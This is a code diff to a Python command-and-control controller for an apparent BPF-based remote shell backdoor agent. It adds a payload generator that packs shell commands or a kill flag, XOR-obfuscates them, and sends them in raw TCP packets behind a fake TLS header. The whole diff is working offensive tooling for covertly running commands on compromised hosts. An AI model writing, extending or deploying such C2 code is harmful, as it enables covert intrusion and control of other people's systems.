@@ -8,6 +8,9 @@ import logging
 
 
 class C2:
+    KILL = 0x01
+    SHELL = 0x02
+
     def __init__(self, args: argparse.Namespace, log_level: int = logging.INFO):
         self.args = args
         self.view = C2View(log_level=log_level, logfile=args.log_file)
@@ -25,6 +28,30 @@ class C2:
 
         return packed_data
 
+    def _generate_payload(self, args: argparse.Namespace, is_kill: bool) -> bytes:
+        """Generates the payload for the BPF Remote Shell Executable Agent.
+
+        Args:
+            args (argparse.Namespace): argparse arguments containing payload options.
+            is_kill (bool): Flag indicating if the payload is for a kill command.
+
+        Returns:
+            bytes: Payload to be sent in the Raw packet
+        """
+        if is_kill:
+            flag = self.KILL
+            command = b""
+        else:
+            flag = self.SHELL
+            command = args.command.encode(encoding="utf-8")
+
+        footer = struct.pack("!BI", flag, len(command))
+
+        payload = command + footer
+
+        payload = bytes([b ^ 0x4F for b in payload])
+        return payload
+
     def tcp_raw_send(self, args: argparse.Namespace) -> bool:
         """Sends a raw TCP packet to the configured agent.
 
@@ -33,15 +60,11 @@ class C2:
         """
 
         try:
-            command = args.command.encode(encoding="utf-8")
+            payload = self._generate_payload(args, False)
         except UnicodeEncodeError:
             self.view.print_error("Could not encode shell command.")
             return False
 
-        cmd_len = struct.pack("!I", len(command))
-
-        payload = command + cmd_len
-        payload = bytes([b ^ 0x4F for b in payload])
         payload_len = struct.pack("!H", len(payload))
 
         tls_header = bytes.fromhex(
